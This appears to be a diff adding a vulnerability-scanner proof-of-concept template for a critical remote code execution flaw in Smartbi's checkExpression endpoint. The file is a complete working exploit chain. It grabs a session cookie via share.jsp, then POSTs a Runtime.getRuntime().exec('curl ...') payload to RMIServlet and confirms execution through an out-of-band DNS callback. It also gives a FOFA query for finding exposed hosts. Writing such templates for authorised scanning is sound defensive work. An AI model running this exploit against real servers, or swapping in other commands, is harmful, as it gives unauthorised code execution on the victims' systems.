@@ -1,0 +1,40 @@
+id: poc-yaml-smartbi-checkexpression-rce
+info:
+  name: Smartbi checkExpression 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - DNSLOG
+  finger: Smartbi
+  fofa: app="SMARTBI"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  resid: '96a0a9d0b86f90d5416d013f4cfe2f23
+
+    b904ab9f5a84712a672523a7b4881ee4
+
+    '
+requests:
+- method: GET
+  path: /smartbi/vision/share.jsp?resid={{.resid}}
+  expression: status_code == 200 && contains(headers,"smartbi")
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>.*?);")
+- method: POST
+  path: /smartbi/vision/RMIServlet
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: JSESSIONID={{.cookie}}
+  data: className=MetricsModelForVModule&methodName=checkExpression&params=["java.lang.Runtime.getRuntime().exec('curl
+    {{.domain}}')"]
+  expression: 'status_code == 200 &&
+
+    contains(body,"true") &&
+
+    !contains(body,"<") &&
+
+    reverse.Verify()
+
+    '
+transport: http
